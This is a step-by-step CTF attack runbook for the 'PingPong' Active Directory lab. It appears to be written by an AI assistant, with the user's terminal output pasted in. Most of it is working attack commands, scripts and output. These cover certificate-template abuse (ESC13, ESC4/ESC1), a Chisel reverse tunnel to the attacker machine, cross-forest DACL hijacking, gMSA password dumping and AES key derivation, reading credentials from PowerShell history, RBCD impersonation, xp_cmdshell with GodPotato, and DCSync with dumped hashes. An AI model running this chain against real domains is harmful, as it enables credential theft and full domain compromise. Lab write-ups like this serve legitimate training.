Here is the tactical, step-by-step execution runbook for the PingPong CTF, tailored with your specific target IP (`10.129.36.10`). This is structured for a clean, terminal-based workflow to keep your session organized as you pivot through the AD environment.

### 1. Initial Setup & Kerberos Configuration
NTLM is disabled, so everything relies on Kerberos.

**1. Update `/etc/hosts`:**
```text
10.129.36.10 dc1.ping.htb ping.htb
127.0.0.1 dc2.pong.htb DC2 pong.htb
```
*(Note: For the pivot later, `dc2.pong.htb` must be the first hostname on the `127.0.0.1` line to avoid SPN truncation issues with MIT krb5).*

**2. Configure `/etc/krb5.conf`:**
```ini
[libdefaults]
    default_realm    = PING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc   = false
    rdns             = false

[realms]
    PING.HTB = {
        kdc = 10.129.36.10:88
    }
    PONG.HTB = {
        kdc = 127.0.0.1:88
    } 

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb  = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb  = PONG.HTB
```

**3. Cache Initial TGT:**
```bash
getTGT.py 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.36.10
export KRB5CCNAME=$(pwd)/c.roberts.ccache
```



### 2. ESC13: Certificate Enrollment & WinRM Access
We abuse the OID-to-group link vulnerability in the `TemporaryWinRM` template to gain WinRM access to DC1.

**1. Request and Authenticate:**
```bash
sudo ntpdate -u 10.129.36.10


certipy-ad req -k -no-pass \
  -target dc1.ping.htb \
  -ca ping-DC1-CA \
  -template TemporaryWinRM \
  -dc-ip 10.129.36.10 \
  -dc-host dc1.ping.htb

certipy-ad auth -pfx c.roberts.pfx -domain ping.htb -username c.roberts -dc-ip 10.129.36.10

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ certipy-ad auth -pfx c.roberts_ca3c52cf-5d94-4925-983e-be598f655902.pfx -username c.roberts -domain ping.htb -dc-ip 10.129.36.10
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): 
[*] Wrote credential cache to 'c.roberts_d386e65a-d21b-4764-b9f8-40b3213a1ac0.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d


export KRB5CCNAME=$(pwd)/c.roberts_1ed03488-7d69-416e-b90c-cc9011743812.ccache
```

**2. Access DC1:**
```bash
evil-winrm -i dc1.ping.htb -r ping.htb
```



### 3. Establish the Pivot to `pong.htb` (DC2)
DC1 has a second NIC routing to `192.168.2.0/24`. We need to tunnel traffic to reach `dc2.pong.htb` (`192.168.2.2`).

**1. On Kali, start Chisel server:**
```bash
chisel server -p 9999 --reverse
```

**2. On DC1 (via evil-winrm session), start Chisel client:**
```powershell
# Upload chisel.exe first if needed
.\chisel.exe client 10.10.16.22:9999 `
  R:1080:socks `
  R:5985:192.168.2.2:5985 `
  R:445:192.168.2.2:445 `
  R:1434:192.168.2.2:1433 `
  R:88:192.168.2.2:88
```



### 4. Cross-Domain DACL Abuse

We use our ownership of `PING\IT` to take control of `PONG\gMSA Managers` and dump the `Pong_gMSA$` password. Run these over `proxychains` (SOCKS proxy).

This is the notorious `KDC_ERR_WRONG_REALM` error. You've hit a well-known limitation in `bloodyAD`'s underlying Python Kerberos library (`minikerberos`): it is really bad at automatically negotiating cross-forest trust referrals. 

When you ask it to talk to `pong.htb` using a `ping.htb` ticket, it gets confused and asks the wrong Domain Controller for the service ticket.

The workaround is to use the native Linux MIT Kerberos tool, `kvno`, to do the heavy lifting. `kvno` perfectly understands your `/etc/krb5.conf` file, will properly ask DC1 for a referral to DC2, and will cache the Service Ticket (TGS) for the LDAP service. Once the TGS is in your cache, `bloodyAD` will just pick it up and use it without complaining.

### 1. Pre-fetch the Service Ticket with `kvno`
Make sure your cache is exported, then run `kvno` to get the LDAP ticket for DC2 (you don't need `proxychains` for this because Kerberos traffic is handled via the IP mappings in your `krb5.conf`):

```bash
export KRB5CCNAME=$(pwd)/c.roberts.ccache
kvno -S ldap dc2.pong.htb
```
*(You can verify it worked by running `klist`. You should see a shiny new ticket for `krbtgt/PONG.HTB@PING.HTB` and `ldap/dc2.pong.htb@PONG.HTB`).*

### 2. Execute the Hijack (Back to `-d pong.htb`)
Now that the ticket is cached, revert the command back to `-d pong.htb` so `bloodyAD` knows the target directory structure, and fire the sequence:

**1. Grant Explicit GenericAll:**
```bash
proxychains bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k \
  add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
```

**2. Convert to Universal:**
```bash
proxychains bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483640
```

**3. Convert to DomainLocal:**
```bash
proxychains bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
```

**4. Add c.roberts to the group:**
```bash
proxychains bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k \
  add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
```

### 3. Refresh and Dump
Now refresh the TGT to pack in your new group permissions, pre-fetch the LDAP ticket again so we don't hit the wrong realm error, and dump the password:

```bash
# 1. Get fresh TGT
getTGT.py 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.36.10
export KRB5CCNAME=$(pwd)/c.roberts.ccache

# 2. Pre-fetch LDAP ticket for the new TGT
kvno -S ldap dc2.pong.htb

# 3. Dump the gMSA blob
proxychains bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k \
  get object 'Pong_gMSA$' --attr msDS-ManagedPassword
```



### 5. JEA on DC1 & User Flag
Connect to the constrained JEA endpoint on DC1 to extract `c.carlssen`'s credentials.

Boom! You've successfully hijacked the DACL across a forest trust and dumped the gMSA password blob. 

Because Active Directory restricts gMSA accounts to AES encryption (RC4 is disabled), we cannot just pass that NTLM hash. We need to compute the Kerberos AES256 key using the raw Base64 material and the specific salt format for this gMSA account.

Here is the exact execution chain to derive the key, grab the ticket, and extract the next user's credentials from the JEA endpoint.

### 1. Derive the AES256 Key
I've pre-filled your exact Base64 string into the derivation script. Create a file named `get_aes.py` on your Kali machine:

```python
from impacket.krb5.crypto import _AES256CTS
import base64

b64_blob = "eFkbWLHQ9ZrAkNUPkIoyBnuGsnXyZOPO5eNOWWlCXuW+gcHc8jj3TpS1td5uZu2q3PoJBjL68DchzLF7DRcebEPpqm2SigCrJiwtO/C+RMfgVtphZX8BTmckbsUG2dDbiSLW6gj1jMN8XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

pwd = base64.b64decode(b64_blob).decode('utf-16-le', 'replace').encode('utf-8')
# The salt is: <UPPER_REALM>host<lower_samaccountname_no_$>.<lower_dnshostname_suffix>
salt = b'PONG.HTBhostpong_gmsa.pong.htb'
aes256 = _AES256CTS.string_to_key(pwd, salt, b'\x00\x00\x10\x00').contents.hex()

print(f"[*] AES256 Key: {aes256}")
```

Run it:
```bash
python3 get_aes.py
```

### 2. Cache the gMSA TGT
Copy the AES256 key output from the script and use it to request a ticket for `Pong_gMSA$`. We route this through the Chisel tunnel to DC2.

```bash
getTGT.py -aesKey <PASTE_AES256_KEY_HERE> -dc-ip 127.0.0.1 'pong.htb/Pong_gMSA$'
export KRB5CCNAME=$(pwd)/Pong_gMSA$.ccache
```

### 3. Hit the JEA Endpoint on DC1
The `Pong_gMSA$` account has access to a constrained "Just Enough Administration" (JEA) PowerShell endpoint on DC1 named `restricted`. We are going to connect to it and read the PowerShell history file, which contains a hardcoded credential for `c.carlssen`.

You will need the `pypsrp` library for this. Install it if you don't have it:
```bash
pipx install pypsrp  # or: pip install pypsrp
```

Create a file named `read_jea.py` and run it. *(Notice we hit DC1 directly here, no proxychains needed).*

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
import os

ccache = os.environ.get('KRB5CCNAME')
print(f"[*] Using ccache: {ccache}")

wsman = WSMan('dc1.ping.htb', port=5985, ssl=False, auth='kerberos', encryption='always')

try:
    with RunspacePool(wsman, configuration_name='restricted') as pool:
        ps = PowerShell(pool)
        
        # Wrapped the path in single quotes to prevent PowerShell variable expansion of the $ symbol
        ps.add_script("type 'C:\\Users\\Pong_gMSA$\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'")
        output = ps.invoke()
        
        print("\n[*] ConsoleHost_history.txt contents:\n")
        print('\n'.join(str(s) for s in output))
        
        # Catch and print any hidden PowerShell errors
        if ps.had_errors:
            print("\n[!] PowerShell Errors:")
            for error in ps.streams.error:
                print(str(error))
                
except Exception as e:
    print(f"[-] Connection failed: {e}")
```

Run the script:
```bash
python3 read_jea.py
```

```
┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ sudo ntpdate -u 10.129.36.10
[sudo] password for z0n: 
2026-04-29 04:22:54.919798 (+0000) +0.026165 +/- 0.154946 10.129.36.10 s1 no-leap

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ sudo nano /etc/hosts

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ getTGT.py 'pong.htb/c.carlssen:A()DUJ!@414' -dc-ip 127.0.0.1
export KRB5CCNAME=$(pwd)/c.carlssen.ccache
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.carlssen.ccache

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ evil-winrm -i dc2.pong.htb -r PONG.HTB
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Carlssen\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\C.Carlssen\Desktop> dir


    Directory: C:\Users\C.Carlssen\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/28/2026   4:32 PM             34 user.txt


*Evil-WinRM* PS C:\Users\C.Carlssen\Desktop> type user.txt
2ad1XXXXXXXXXXXXXXXXXXXXXXXXXXXX
*Evil-WinRM* PS C:\Users\C.Carlssen\Desktop> 
```

### 6. RBCD & MSSQL Escalation
We configure RBCD on `svc_sql`, impersonate an MSSQL admin (`c.adam`), and execute code.

**1. Set RBCD (Run inside the `c.carlssen` WinRM session on DC2):**
```powershell
$svc = New-Object System.DirectoryServices.DirectoryEntry("LDAP://dc2.pong.htb/CN=svc_sql,OU=Service Accounts,DC=pong,DC=htb")
$gmsaSid = '<Pong_gMSA_SID>'
$sd = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$gmsaSid)")
$bytes = New-Object byte[] $sd.BinaryLength
$sd.GetBinaryForm($bytes,0)
$svc.Properties['msDS-AllowedToActOnBehalfOfOtherIdentity'].Value = $bytes
$svc.CommitChanges()
```

**2. S4U impersonation (On Kali):**
```bash
export KRB5CCNAME=$(pwd)/Pong_gMSA$.ccache
proxychains getST.py -k -no-pass -spn 'mssqlsvc/dc2.pong.htb' -impersonate 'c.adam' -dc-ip 127.0.0.1 'pong.htb/Pong_gMSA$'
export KRB5CCNAME=$(pwd)/c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
```

**3. Access MSSQL & Execute Commands:**
```bash
proxychains mssqlclient.py -k -no-pass 'pong.htb/c.adam@dc2.pong.htb' -dc-ip 127.0.0.1 -port 1434
```
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;


┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ mssqlclient.py -k -no-pass 'dc2.pong.htb' -dc-ip 192.168.2.2 -port 1434
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\C.Adam  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (pong\C.Adam  dbo@master)> RECONFIGURE;
SQL (pong\C.Adam  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (pong\C.Adam  dbo@master)> RECONFIGURE;
SQL (pong\C.Adam  dbo@master)> EXEC xp_cmdshell 'whoami';
output         
------------   
pong\svc_sql   
NULL           
SQL (pong\C.Adam  dbo@master)> EXEC xp_cmdshell 'whoami /priv';
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
SQL (pong\C.Adam  dbo@master)> 

```



### 7. GodPotato to DCSync
Drop `GodPotato.exe` on DC2, execute it via MSSQL, and dump CA Manager credentials.

**1. In MSSQL `xp_cmdshell`:**
```sql
-- Assuming GodPotato.exe is uploaded to C:\Windows\Tasks\GP.exe
EXEC xp_cmdshell 'C:\Windows\Tasks\GP.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators C.Carlssen /add"';
```

**2. DCSync `R.Martinelli` (On Kali):**
```bash
export KRB5CCNAME=$(pwd)/c.carlssen.ccache
proxychains secretsdump.py -k -no-pass 'pong.htb/c.carlssen@dc2.pong.htb' -dc-ip 127.0.0.1 -target-ip 127.0.0.1 -just-dc-user r.martinelli

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/PingPong]
└─$ # Ensure the ticket is active
export KRB5CCNAME=$(pwd)/c.carlssen.ccache

# Execute the targeted DCSync
proxychains secretsdump.py -k -no-pass 'pong.htb/c.carlssen@dc2.pong.htb' \
    -dc-ip 192.168.2.2 -target-ip 192.168.2.2 \
    -just-dc-user r.martinelli
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:445  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:49668  ...  OK
R.Martinelli:1124:aad3b435b51404eeaad3b435b51404ee:d60fc26a0569b953a5cebd1392232630:::
[*] Kerberos keys grabbed
R.Martinelli:aes256-cts-hmac-sha1-96:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
R.Martinelli:aes128-cts-hmac-sha1-96:14f94b4b3deaabde802460945a2079e9
R.Martinelli:des-cbc-md5:8c437f1f578f3b3b
[*] Cleaning up... 

```



### 8. ESC4 to ESC1 (Root)
Abuse `R.Martinelli`'s CA Manager rights on DC1 to overwrite a template and escalate to Domain Admin on `ping.htb`.

**1. Modify the template:**
```bash
getTGT.py -aesKey <R_MARTINELLI_AES256> -dc-ip 127.0.0.1 'pong.htb/r.martinelli'
export KRB5CCNAME=$(pwd)/r.martinelli.ccache

# Pre-fetch cross-realm TGS
kvno ldap/dc1.ping.htb

# Pwn the template on DC1
certipy template -k -no-pass -u 'r.martinelli@pong.htb' -target dc1.ping.htb -dc-ip 10.129.36.10 -template SmartcardAuthentication -write-default-configuration -force
```

**2. Switch back to `c.roberts` and enroll as Admin:**
```bash
export KRB5CCNAME=$(pwd)/c.roberts.ccache

certipy req -k -no-pass -target dc1.ping.htb -dc-ip 10.129.36.10 \
  -ca ping-DC1-CA -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' -sid 'S-1-5-21-<PING.HTB_DOMAIN_SID>-500'

certipy auth -pfx administrator.pfx -domain ping.htb -username Administrator
export KRB5CCNAME=$(pwd)/administrator.ccache
```

**3. Claim Root:**
```bash
evil-winrm -i dc1.ping.htb -r ping.htb -c c.roberts.pfx
# type C:\Users\Administrator\Desktop\root.txt
```